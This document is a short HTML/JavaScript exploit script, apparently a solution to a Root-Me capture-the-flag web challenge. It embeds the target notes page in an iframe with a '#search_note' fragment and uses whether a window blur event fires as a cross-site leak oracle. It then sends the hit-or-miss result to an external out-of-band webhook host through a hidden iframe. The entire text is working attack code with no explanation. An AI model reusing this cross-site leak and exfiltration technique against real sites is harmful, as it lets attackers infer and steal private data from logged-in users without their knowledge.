<script>
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/1353";
const WEBHOOK = "https://85531c6a18bfcfaeb4aegux4iseyyyyyb.oast.pro";

window.onload = function () {
    let blurFired = false;
    window.addEventListener("blur", () => { blurFired = true; });
    const iframe = document.createElement("iframe");
    iframe.src = TARGET + "#search_note";
    document.body.appendChild(iframe);
    setTimeout(() => {
        const result = blurFired ? "hit" : "miss";
        const ex = document.createElement("iframe");
        ex.src = WEBHOOK + "?result=" + result;
        ex.style.display = "none";
        document.body.appendChild(ex);
    }, 1000);
};
</script>
